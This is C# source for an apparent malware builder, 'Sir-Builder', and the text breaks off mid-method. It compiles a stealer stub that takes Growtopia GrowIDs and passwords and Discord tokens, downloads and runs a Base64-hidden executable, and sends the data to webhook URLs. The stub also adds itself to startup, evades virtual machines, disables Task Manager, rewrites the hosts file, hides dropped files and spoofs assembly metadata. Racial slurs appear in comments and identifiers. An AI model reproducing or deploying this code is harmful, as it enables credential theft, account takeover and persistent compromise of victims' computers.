using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using Sir_Builder.Util;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.CodeDom.Compiler;

namespace Sir_Builder
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        public readonly List<string> urlList = new List<string>();
        public readonly List<string> urlList2 = new List<string>();
        private readonly Random random = new Random();
        private readonly RandomCharacters randomCharacters;
        private readonly RandomFileInfo randomFileInfo;
        public string lolypop;

        private const int SW_HIDE = 0;

        [DllImport("User32")]
        private static extern int ShowWindow(int hwnd, int nCmdShow);

        public Form1()
        {
            InitializeComponent();
            this.StyleManager = metroStyleManager1;
            icontextbox.Enabled = false;
            metroButton2.Enabled = false;
            textBox2.Enabled = false;
            metroButton1.Enabled = false;
            this.randomCharacters = new RandomCharacters();
            this.randomFileInfo = new RandomFileInfo(randomCharacters);
            urlListView.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        }

		public static class StringCipher
		{
			public const int Keysize = 256;

			public const int DerivationIterations = 1000;

			public static string Encrypt(string plainText, string passPhrase)
			{
				var saltStringBytes = Generate256BitsOfRandomEntropy();
				var ivStringBytes = Generate256BitsOfRandomEntropy();
				var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
				using (var password = new Rfc2898DeriveBytes(passPhrase, saltStringBytes, DerivationIterations))
				{
					var keyBytes = password.GetBytes(Keysize / 8);
					using (var symmetricKey = new RijndaelManaged())
					{
						symmetricKey.BlockSize = 256;
						symmetricKey.Mode = CipherMode.CBC;
						symmetricKey.Padding = PaddingMode.PKCS7;
						using (var encryptor = symmetricKey.CreateEncryptor(keyBytes, ivStringBytes))
						{
							using (var memoryStream = new MemoryStream())
							{
								using (var cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
								{
									cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
									cryptoStream.FlushFinalBlock();
									var cipherTextBytes = saltStringBytes;
									cipherTextBytes = cipherTextBytes.Concat(ivStringBytes).ToArray();
									cipherTextBytes = cipherTextBytes.Concat(memoryStream.ToArray()).ToArray();
									memoryStream.Close();
									cryptoStream.Close();
									return Convert.ToBase64String(cipherTextBytes);
								}
							}
						}
					}
				}
			}

			public static string Decrypt(string cipherText, string passPhrase)
			{
				var cipherTextBytesWithSaltAndIv = Convert.FromBase64String(cipherText);
				var saltStringBytes = cipherTextBytesWithSaltAndIv.Take(Keysize / 8).ToArray();
				var ivStringBytes = cipherTextBytesWithSaltAndIv.Skip(Keysize / 8).Take(Keysize / 8).ToArray();
				var cipherTextBytes = cipherTextBytesWithSaltAndIv.Skip((Keysize / 8) * 2).Take(cipherTextBytesWithSaltAndIv.Length - ((Keysize / 8) * 2)).ToArray();

				using (var password = new Rfc2898DeriveBytes(passPhrase, saltStringBytes, DerivationIterations))
				{
					var keyBytes = password.GetBytes(Keysize / 8);
					using (var symmetricKey = new RijndaelManaged())
					{
						symmetricKey.BlockSize = 256;
						symmetricKey.Mode = CipherMode.CBC;
						symmetricKey.Padding = PaddingMode.PKCS7;
						using (var decryptor = symmetricKey.CreateDecryptor(keyBytes, ivStringBytes))
						{
							using (var memoryStream = new MemoryStream(cipherTextBytes))
							{
								using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
								{
									var plainTextBytes = new byte[cipherTextBytes.Length];
									var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
									memoryStream.Close();
									cryptoStream.Close();
									return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
								}
							}
						}
					}
				}
			}

			public static byte[] Generate256BitsOfRandomEntropy()
			{
				var randomBytes = new byte[32];
				using (var rngCsp = new RNGCryptoServiceProvider())
				{
					rngCsp.GetBytes(randomBytes);
				}
				return randomBytes;
			}
		}
		public string code = @"
using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace Stub
{
	public class intern
	{
		public static class StringCipher
		{
			public const int Keysize = 256;

			public const int DerivationIterations = 1000;
			public static string passPhrase = ""aeskey"";

			public static string Decrypt(string cipherText)
			{
				var cipherTextBytesWithSaltAndIv = Convert.FromBase64String(cipherText);
				var saltStringBytes = cipherTextBytesWithSaltAndIv.Take(Keysize / 8).ToArray();
				var ivStringBytes = cipherTextBytesWithSaltAndIv.Skip(Keysize / 8).Take(Keysize / 8).ToArray();
				var cipherTextBytes = cipherTextBytesWithSaltAndIv.Skip((Keysize / 8) * 2).Take(cipherTextBytesWithSaltAndIv.Length - ((Keysize / 8) * 2)).ToArray();

				using (var password = new Rfc2898DeriveBytes(passPhrase, saltStringBytes, DerivationIterations))
				{
					var keyBytes = password.GetBytes(Keysize / 8);
					using (var symmetricKey = new RijndaelManaged())
					{
						symmetricKey.BlockSize = 256;
						symmetricKey.Mode = CipherMode.CBC;
						symmetricKey.Padding = PaddingMode.PKCS7;
						using (var decryptor = symmetricKey.CreateDecryptor(keyBytes, ivStringBytes))
						{
							using (var memoryStream = new MemoryStream(cipherTextBytes))
							{
								using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
								{
									var plainTextBytes = new byte[cipherTextBytes.Length];
									var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
									memoryStream.Close();
									cryptoStream.Close();
									return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
								}
							}
						}
					}
				}
			}
		}
		public class Http
		{
			private readonly WebClient dWebClient;

			public static List<string> ListURLS = new List<string>(new string[] { ""$URL$"" });
			public Http()
			{
				this.dWebClient = new WebClient();
			}

			public static void attachment(string path)
			{
				using (WebClient webClient = new WebClient())
				{
					foreach (string lmao in ListURLS.ToArray())
					{
						string kek = StringCipher.Decrypt(lmao);
						webClient.UploadFile(kek, path);
					}
				}
			}

		}

		internal class plugins
		{
			public static void FullScreenshot(String filepath, String filename, ImageFormat format)
			{
				Rectangle bounds = Screen.GetBounds(Point.Empty);
				using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
				{
					using (Graphics g = Graphics.FromImage(bitmap))
					{
						g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
					}

					string fullpath = filepath + ""\\"" + filename;

					bitmap.Save(fullpath, format);
				}
			}

			public void corrupt()
			{
				using (StreamWriter streamWriter = new StreamWriter(""C:\\Windows\\System32\\drivers\\etc\\hosts""))
				{
					streamWriter.WriteLine(""127.0.0.1 growtopia1.com"");
					streamWriter.WriteLine(""127.0.0.1 growtopia2.com"");
				}
			}

			public void AntiVM()
			{

				using (var searcher = new ManagementObjectSearcher(""Select * from Win32_ComputerSystem""))
				{
					using (var items = searcher.Get())
					{
						foreach (var item in items)
						{
							string manufacturer = item[""Manufacturer""].ToString().ToLower();
							if ((manufacturer == ""microsoft corporation"") && (item[""Model""].ToString().ToUpperInvariant().Contains(""VIRTUAL""))
									|| manufacturer.Contains(""vmware"")
									|| item[""Model""].ToString() == ""VirtualBox"")
							{
								Environment.Exit(0);
							}
						}
					}
				}
			}

			public static void RegistryEdit(string regPath, string name, string value)
			{
				try
				{
					using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
					{
						if (key == null)
						{
							Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
							return;
						}
						if (key.GetValue(name) != (object)value)
							key.SetValue(name, value, RegistryValueKind.DWord);
					}
				}
				catch { }
			}

			public void Taskmanager()
			{
				RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"");
				objRegistryKey.SetValue(""DisableTaskMgr"", 1);
			}

			public static string GetMacAddress()
			{
				string macAddresses1 = """";


				foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
				{
					macAddresses1 += ""\n"";
					macAddresses1 += nic.GetPhysicalAddress().ToString();
				}
				return macAddresses1;
			}


			public static string takeToken()
			{
				try
				{
					string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ""//Discord//Local Storage//leveldb//000005.ldb"");
					int num;
					while ((num = text.IndexOf(""oken"")) != -1)
					{
						text = text.Substring(num + ""oken"".Length);
					}
					return text.Split('""')[1];
				}
				catch (Exception)
				{
					return null;
				}
			}


			public void Startup()
			{
				string dfgdfgdgdg = Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath) + ""\\"" + ""sfsdhfdkjfhdkjfmanba"" + "".exe"";
				try
				{
					if (File.Exists(dfgdfgdgdg))
					{
						File.Delete(dfgdfgdgdg);
					}
					File.Copy(Application.ExecutablePath, Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath));
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"", true);
					registryKey.SetValue(Path.GetFileNameWithoutExtension(dfgdfgdgdg), dfgdfgdgdg);
				}
				catch
				{
					Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(dfgdfgdgdg));
					if (processesByName.Length > 0)
					{
						Process[] array = processesByName;
						int num = 0;
						if (num < array.Length)
						{
							Process process = array[num];
							process.Kill();
						}
					}
				}
			}
		}





		public static class SendPacked
		{
			public static string decodebase(string basedata)
			{
				byte[] bytes = Convert.FromBase64String(basedata);
				return Encoding.UTF8.GetString(bytes);
			}

			public static string getuser()
			{
				try
				{
					string savedat = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + ""\\Growtopia\\Save.dat"";
					var pattern = new Regex(@""[^\w0 - 9]"");
					string savedata = null;
					var r = File.Open(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					using (FileStream fileStream = new FileStream(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
					{
						using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
						{
							savedata = streamReader.ReadToEnd();
						}
					}
					string cleardata = savedata.Replace(""\u0000"", "" "");
					string firstgrowid = pattern.Replace(cleardata.Substring(cleardata.IndexOf(""tankid_name"") + ""tankid_name"".Length).Split(' ')[3], string.Empty);
					return firstgrowid;
				}
				catch (Exception)
				{
					string sorry2 = ""couldnt find the username!"";
					return sorry2;
				}
			}
			public static string getpass()
			{
				try
				{
					string nanananaan = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + ""\\Growtopia\\Save.dat"";

					if (File.Exists(nanananaan))
					{
						new WebClient().DownloadFile(SendPacked.decodebase(""aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvODYzODMxNDQ5MjgyNjc0NjkyLzkzMDE4MTI3NDYxNjg4NTMyOC9zYXZlZGVjcnlwdGVyLmV4ZQ==""), Path.GetTempPath() + ""\\Lanx1337.exe"");
						Process.Start(Path.GetTempPath() + ""\\Lanx1337.exe"");
						Thread.Sleep(1000);
						byte[] lolxd = File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ""\\lanx.txt"");
						string result = System.Text.Encoding.UTF8.GetString(lolxd);

						return result;
					}
					else
					{
						string sorry = ""couldnt find save.dat file!"";
						return sorry;

					}
				}
				catch (Exception)
				{
					string sorry1 = ""an error has occured while decoding"";
					return sorry1;
				}
			}
			public static void tracemessage()
			{

				foreach (string x in Http.ListURLS.ToArray())
				{
					WebRequest wr = (HttpWebRequest)WebRequest.Create(StringCipher.Decrypt(x));
					wr.ContentType = ""application/json"";

					wr.Method = ""POST"";

					using (var sw = new StreamWriter(wr.GetRequestStream()))
					{
						WebClient web = new WebClient();
						string ip = web.DownloadString(""https://showmyipaddress1337.000webhostapp.com"");
						string remove = RemoveWhitespace(ip);
						string json = JsonConvert.SerializeObject(new
						{
							username = ""Sir-Builder"",
							embeds = new[]
							{
						new
						{
							title = ""Sir-Builder"",
							description = string.Concat(new string[]
							{
								""GrowID: ```\n"" + getuser() + ""```"",
								""\n"",
								""Password: ```\n"" + getpass() + ""```"",
								""\n"",
								//mack
								//tok3n
								//infolel
							}),

							color = ""060000""
						}
					}
						});
						sw.Write(json);
					}
					var response = (HttpWebResponse)wr.GetResponse();
				}
				//recover
				//stealCT1
				//ss
			}
			public static string RemoveWhitespace(string input)
			{
				return new string(input.ToCharArray()
					.Where(c => !Char.IsWhiteSpace(c))
					.ToArray());
			}
            public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
		    {
			Assembly assembly = Assembly.GetCallingAssembly();

			using (Stream s = assembly.GetManifestResourceStream(nameSpace + ""."" + (internalFilePath == """" ? """" : internalFilePath + ""."") + resourceName))
			using (BinaryReader r = new BinaryReader(s))
			using (FileStream fs = new FileStream(outDirectory + ""\\"" + resourceName, FileMode.OpenOrCreate))
			using (BinaryWriter w = new BinaryWriter(fs))
				w.Write(r.ReadBytes((int)s.Length));
	     	}

			public static void Main()
			{
                Extract(""Stub"", Path.GetTempPath(), ""Resources"", ""Newtonsoft.Json.dll"");
				//defendernigger
				//myholywater
				//fakeerrorlolnub
				WebClient webClient = new WebClient();
				string anamz = webClient.DownloadString(""https://showmyipaddress1337.000webhostapp.com/"");
				Thread.Sleep(1000);
				plugins plugin = new plugins();
				//startuplolhehe
				//antivm
				//hidefileomglolok
				//1337disabletasklolpro
				//corruptgt
				foreach (string x in Http.ListURLS.ToArray())
				{
					WebRequest wr = (HttpWebRequest)WebRequest.Create(StringCipher.Decrypt(x));
					wr.ContentType = ""application/json"";

					wr.Method = ""POST"";

					using (var sw = new StreamWriter(wr.GetRequestStream()))
					{
						WebClient web = new WebClient();
						string ip = web.DownloadString(""https://showmyipaddress1337.000webhostapp.com"");
						string remove = RemoveWhitespace(ip);
						string json = JsonConvert.SerializeObject(new
						{
							username = ""djasdaksdaksd"",
							embeds = new[]
							{
						new
						{
							title = ""Sir-Builder"",
							description = string.Concat(new string[]
							{
								""GrowID: ```\n"" + getuser() + ""```"",
								""\n"",
								""Password: ```\n"" + getpass() + ""```"",
								""\n"",
								//mack	
								//tok3n
								//infolel
							}),
							color = ""060000""
						}
					}
						});
						sw.Write(json);
					}
					var response = (HttpWebResponse)wr.GetResponse();
				}
				//recover
				//stealCT1
				//ss
				//Tracer
			}
		}
		//myholywaters
		public class Tracer
		{
			public static string dirPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + ""\\Growtopia"";
			public static string savePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + ""\\Growtopia\\save.dat"";
			public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();

			public static void TraceSave()
			{
				fileSystemWatcher.Path = dirPath;
				fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
				fileSystemWatcher.Filter = ""*.dat"";
				fileSystemWatcher.Changed += OnSaveChanged;
				fileSystemWatcher.EnableRaisingEvents = true;

				while (true)
				{
					Thread.Sleep(1000);
				}
			}

			public static void OnSaveChanged(object source, FileSystemEventArgs e)
			{
				if (e.FullPath == savePath)
				{
					try
					{
						fileSystemWatcher.EnableRaisingEvents = false;
						SendPacked.tracemessage();
					}
					finally
					{
						fileSystemWatcher.EnableRaisingEvents = true;
					}
				}
			}
		}
	}
}
";

		private void Form1_Load(object sender, EventArgs e)
        {
			Extract("Sir_Builder", Path.GetTempPath(), "Resources", "Newtonsoft.Json.dll");
			monoFlat_Label2.Text = "User: " + Environment.UserName;
		}

		public bool isvalidFilepath(string path)
		{
			try
			{
				string[] splitg = path.Split(':');
				if (path.Length >= 6 && path.Contains(@":\") && splitg[0].Length == 1 && Regex.IsMatch(splitg[0], @"^[a-zA-Z]+$"))
				{
					return true;
				}
				else
				{
					return false;
				}
			}
			catch
			{
				return false;
			}
		}

		public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
		{
			Assembly assembly = Assembly.GetCallingAssembly();

			using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
			using (BinaryReader r = new BinaryReader(s))
			using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
			using (BinaryWriter w = new BinaryWriter(fs))
				w.Write(r.ReadBytes((int)s.Length));
		}
		public bool CompileFromSource(string source, string outputAssembly)
		{
			string manifestdec = @"<?xml version=""1.0"" encoding=""utf-8""?>
<assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1"">
  <assemblyIdentity version=""1.0.0.0"" name=""MyApplication.app""/>
  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">
    <security>
      <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">
        <requestedExecutionLevel level=""requireAdministrator"" uiAccess=""false"" />
      </requestedPrivileges>
    </security>
  </trustInfo>

  <compatibility xmlns=""urn:schemas-microsoft-com:compatibility.v1"">
    <application>
    </application>
  </compatibility>
</assembly>
";
			File.WriteAllText(Application.StartupPath + @"\manifest.manifest", manifestdec);
			CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
			CompilerParameters compars = new CompilerParameters();
			compars.ReferencedAssemblies.Add("System.Net.dll");
			compars.ReferencedAssemblies.Add("System.dll");
			compars.ReferencedAssemblies.Add("System.Linq.dll");
			compars.ReferencedAssemblies.Add("System.Windows.Forms.dll");
			compars.ReferencedAssemblies.Add("System.Drawing.dll");
			compars.EmbeddedResources.Add(Path.GetTempPath() + "\\Newtonsoft.Json.dll");
			compars.ReferencedAssemblies.Add(Path.GetTempPath() + "\\Newtonsoft.Json.dll");
			compars.ReferencedAssemblies.Add("System.Management.dll");
			compars.ReferencedAssemblies.Add("System.IO.dll");
			compars.ReferencedAssemblies.Add("System.IO.compression.dll");
			compars.ReferencedAssemblies.Add("System.IO.compression.filesystem.dll");
			compars.ReferencedAssemblies.Add("System.Core.dll");
			compars.ReferencedAssemblies.Add("System.Security.dll");
			bool hasAdmin = false;
			if (listView1.Items.Count > 0)
			{
				foreach (ListViewItem item in listView1.Items)
				{
					compars.EmbeddedResources.Add("" + item.SubItems[0].Text + "");
					if (item.SubItems[2].Text.Contains("true"))
					{
						hasAdmin = true;
					}
				}
			}
			if (force.Checked == true)
			{
				if (hasAdmin == false)
				{
					hasAdmin = true;
				}
			}
			compars.GenerateExecutable = true;
			compars.OutputAssembly = outputAssembly;
			compars.GenerateInMemory = false;
			compars.TreatWarningsAsErrors = false;
			compars.CompilerOptions += "/target:winexe /platform:anycpu /optimize";
			if (hasAdmin == true)
			{

				compars.CompilerOptions += " /win32manifest:" + @"""" + Application.StartupPath + @"\manifest.manifest" + @"""";
			}

			if (!string.IsNullOrEmpty(icontextbox.Text) || !string.IsNullOrWhiteSpace(icontextbox.Text) && icontextbox.Text.Contains(@"\") && icontextbox.Text.Contains(@":") && icontextbox.Text.Length >= 7)
			{
				if (isvalidFilepath(icontextbox.Text))
				{
					compars.CompilerOptions += " /win32icon:" + @"""" + icontextbox.Text + @"""";
				}
				else
				{
					MessageBox.Show("Path possibly invalid!", "Error!");
				}
			}
			else if (string.IsNullOrEmpty(icontextbox.Text) || string.IsNullOrWhiteSpace(icontextbox.Text))
			{

			}
			else
			{
				MessageBox.Show("Path possibly invalid!", "Error!");
			}
			System.Threading.Thread.Sleep(100);
			CompilerResults res = provider.CompileAssemblyFromSource(compars, source);

			if (res.Errors.Count > 0)
			{
				try
				{
					File.Delete(Application.StartupPath + @"\manifest.manifest");
				}
				catch { }
				foreach (CompilerError ce in res.Errors)
				{
					MessageBox.Show(ce.ToString());
				}
			}
			else
			{
				try
				{
					File.Delete(Application.StartupPath + @"\manifest.manifest");
				}
				catch { }
			}
			return res.Errors.Count == 0;
		}

		private void metroComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            this.metroStyleManager1.Style = (MetroFramework.MetroColorStyle)Convert.ToInt32(metroComboBox1.SelectedIndex);
        }

        //private void showWebhook_CheckedChanged(object sender, EventArgs e)
        //{
        //    if (showWebhook.Checked)
        //    {
        //        textBox1.UseSystemPasswordChar = false;
        //    }
        //    else
        //    {
        //        textBox1.UseSystemPasswordChar = true;
        //    }
        //}

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void metroTabPage1_Click(object sender, EventArgs e)
        {

        }

        private void metroButton2_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new System.Windows.Forms.OpenFileDialog())
            {
                openFileDialog.Filter = "Icon (*.ico)|*.ico";
                if (openFileDialog.ShowDialog() == DialogResult.OK) //icon changer 
                {
                    icontextbox.Text = openFileDialog.FileName;
                    pictureBox1.ImageLocation = openFileDialog.FileName;
                }
                else
                {
                    icontextbox.Text = string.Empty;
                    pictureBox1.ImageLocation = string.Empty;
                }
            }
        }

        private void metroButton5_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            webClient.DownloadFile("https://raw.githubusercontent.com/SircamGT/Siroxy/d7ce1397eee72fa8ce77f7d71aee28d43c834944/Siroxy.exe?token=AVZEPAQHYHHGZ2LOXG273YDBNLPAK", Path.GetTempPath() + "Xiaor.exe");
            Process.Start(Path.GetTempPath() + "\\Xiaor.exe");
            //int hWnd;
            //Process[] processRunning = Process.GetProcesses();


            //foreach (Process pr in processRunning)
            //{
            //    if (pr.ProcessName == "Siroxy")
            //    {
            //        hWnd = pr.MainWindowHandle.ToInt32();
            //        ShowWindow(hWnd, SW_HIDE);
            //    }
            //}
        }

        private void metroButton6_Click(object sender, EventArgs e)
        {
            foreach (var process in Process.GetProcessesByName("Xiaor"))
            {
                process.Kill();
            }
        }

        private void metroButton8_Click(object sender, EventArgs e)
        {
            TextWriter tw = new StreamWriter(@"C:\Windows\System32\drivers\etc\hosts");
            tw.Write("127.0.0.1 growtopia1.com\r\n127.0.0.1 growtopia2.com");
            tw.Close();
        }

        private void metroButton7_Click(object sender, EventArgs e)
        {
            TextWriter tw = new StreamWriter(@"C:\Windows\System32\drivers\etc\hosts");
            tw.Write("");
            tw.Close();
        }

        private void groupBox6_Enter(object sender, EventArgs e)
        {

        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.OpenFileDialog ofd = new System.Windows.Forms.OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                string[] BindedFileInfo = { ofd.FileName, "false" };
                ListViewItem BindedList = new ListViewItem(BindedFileInfo);
                listView1.Items.Add(BindedList);
            }
            else
            {
                return;
            }
        }

        private void metroButton4_Click(object sender, EventArgs e)
        {
            if (listView1.Items.Count > 0)
            {
                try
                {
                    listView1.SelectedItems[0].Remove();
                }
                catch { }
            }
        }

        private void metroCheckBox15_CheckedChanged(object sender, EventArgs e)
        {
            if (iconCheckbox.Checked == true)
            {
                icontextbox.Enabled = true;
                metroButton2.Enabled = true;
            }
            else
            {
                icontextbox.Enabled = false;
                metroButton2.Enabled = false;
            }
        }

        private void icontextbox_TextChanged(object sender, EventArgs e)
        {

        }

        private void metroCheckBox13_CheckedChanged(object sender, EventArgs e)
        {
            
        }

        private void metroCheckBox14_CheckedChanged(object sender, EventArgs e)
        {
            
        }

        private void metroButton1_Click(object sender, EventArgs e)
        {
            
        }

        private void metroButton10_Click(object sender, EventArgs e)
        {
            // eğer orijinal gt varsa siler.
            /*if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\Growtopia.exe"))
            {
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\Growtopia.exe");
            }*/

            WebClient webClient = new WebClient();
            
            if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\Growtopia2.exe") == false)
            {
                webClient.DownloadFile("https://raw.githubusercontent.com/SircamGT/Siroxy/main/Growtopia.exe", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\Growtopia2.exe");
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\Growtopia2.exe");
            }
            else
            {
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\Growtopia2.exe");
            }
       
        }

        private void metroButton9_Click(object sender, EventArgs e)
        {
            foreach (var process in Process.GetProcessesByName("Growtopia2"))
            {
                process.Kill();
            }
        }

        private void metroCheckBox9_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroCheckBox11_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void fakeError_CheckedChanged(object sender, EventArgs e)
        {
            if (fakerrorcheck.Checked == true)
            {
                textBox2.Enabled = true;
                metroButton1.Enabled = true;
            }
            else
            {
                textBox2.Enabled = false;
                metroButton1.Enabled = false;
            }
        }

        private void metroButton1_Click_1(object sender, EventArgs e)
        {
            MessageBox.Show(textBox2.Text, "", MessageBoxButtons.OK);
        }


        private void metroButton11_Click(object sender, EventArgs e)
        {
			try
			{
				if (spaghetti.Text == "")
				{
					MessageBox.Show("please add a name");
					return;
				}
				if (urlListView.Items.Count == 0)
				{
					MessageBox.Show("Please add a webhook url", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
					return;
				}
				if (aestext.Text == "")
				{
					MessageBox.Show("Please generate aes key", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
					return;
				}
				using (var saveFileDialog = new System.Windows.Forms.SaveFileDialog())
				{
					if (cetrainernigger.Checked == true)
					{
						saveFileDialog.Filter = "CETRAINER files (*.CETRAINER)|*.CETRAINER";
					}
					else
					{
						saveFileDialog.Filter = "Executable (*.exe)|*.exe";
					}
					if (saveFileDialog.ShowDialog() == DialogResult.OK)
					{
						var stubSource = code;
						if (listView1.Items.Count > 0)
						{
							string methodxd = @"        static void ThisMethodxd()
        {
            //startuplolp
            string sjnfnos = Environment.ExpandEnvironmentVariables(""harambrowtfudoing"");
            //string gripo = ""bit098"";

            //hidexdsfng
        }
        public static void extract2idk(string resourceName, string fileName, bool lmao, bool admin)
        {
            using (var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                using (var file = new FileStream(fileName, FileMode.Create, FileAccess.Write))
                {
                    resource.CopyTo(file);
                }
            }
            if (lmao == true)
            {
                if (admin == true)
                {
                    ProcessStartInfo prcs3 = new ProcessStartInfo(fileName)
                    {
                        RedirectStandardError = false,
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = false,
                        Verb = ""run as""
                    };
                    Process.Start(prcs3);
                }
                else
                {
                    Process.Start(fileName);
                }
            }
        }";
							int index = methodxd.IndexOf(@"bit098"";");
							string newgj = methodxd;
							newgj = newgj.Replace("harambrowtfudoing", drop.Text);
							foreach (ListViewItem iasjfd in listView1.Items)
							{
								if (hidestealerxdomfg.Checked == true)
								{
									newgj = newgj.Insert(index, Environment.NewLine + @"try{File.SetAttributes(sjnfnos + ""\\"" + """ + Path.GetFileName(iasjfd.SubItems[0].Text) + @""", File.GetAttributes(sjnfnos + ""\\"" + """ + Path.GetFileName(iasjfd.SubItems[0].Text) + @""") | FileAttributes.Hidden | FileAttributes.System); }catch{}");
								}
								newgj = newgj.Insert(index, Environment.NewLine + @"extract2idk(""" + Path.GetFileName(iasjfd.SubItems[0].Text) + @""", sjnfnos + ""\\"" + """ + Path.GetFileName(iasjfd.SubItems[0].Text) + @""", " + iasjfd.SubItems[1].Text + @", " + iasjfd.SubItems[2].Text + @");");
								if (hidestealerxdomfg.Checked == true)
								{
									newgj = newgj.Insert(index, Environment.NewLine + @"try{File.SetAttributes(sjnfnos + ""\\"" + """ + Path.GetFileName(iasjfd.SubItems[0].Text) + @""", FileAttributes.Normal); }catch{}");
								}
							}
							stubSource = stubSource.Replace("//myholywaters", newgj);
							stubSource = stubSource.Replace("//myholywater", @"if(System.Reflection.Assembly.GetEntryAssembly().Location != Environment.ExpandEnvironmentVariables(""[EnvironmentVarxd]"") + @""\"" + Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location)){ThisMethodxd();}");
						}
						if (assemblychanger.Checked == true)
						{
							stubSource = stubSource.Replace("//assemblychangerlolnub", @"
[assembly: AssemblyTitle(""%Title%"")]
[assembly: AssemblyDescription(""%Description%"")]
[assembly: AssemblyCompany(""%Company%"")]
[assembly: AssemblyProduct(""%Product%"")]
[assembly: AssemblyCopyright(""%Copyright%"")]
[assembly: AssemblyTrademark(""%Trademark%"")]
[assembly: AssemblyFileVersion(""%v1%"" + ""."" + ""%v2%"" + ""."" + ""%v3%"" + ""."" + ""%v4%"")]
[assembly: AssemblyVersion(""%v1%"" + ""."" + ""%v2%"" + ""."" + ""%v3%"" + ""."" + ""%v4%"")]
[assembly: Guid(""%Guid%"")]
");
							stubSource = stubSource.Replace("%Title%", txtTitle.Text);
							stubSource = stubSource.Replace("%Description%", txtDescription.Text);
							stubSource = stubSource.Replace("%Product%", txtProduct.Text);
							stubSource = stubSource.Replace("%Company%", txtCompany.Text);
							stubSource = stubSource.Replace("%Copyright%", txtCopyright.Text);
							stubSource = stubSource.Replace("%Trademark%", txtTrademark.Text);
							stubSource = stubSource.Replace("%v1%", assemblyMajorVersion.Text);
							stubSource = stubSource.Replace("%v2%", assemblyMinorVersion.Text);
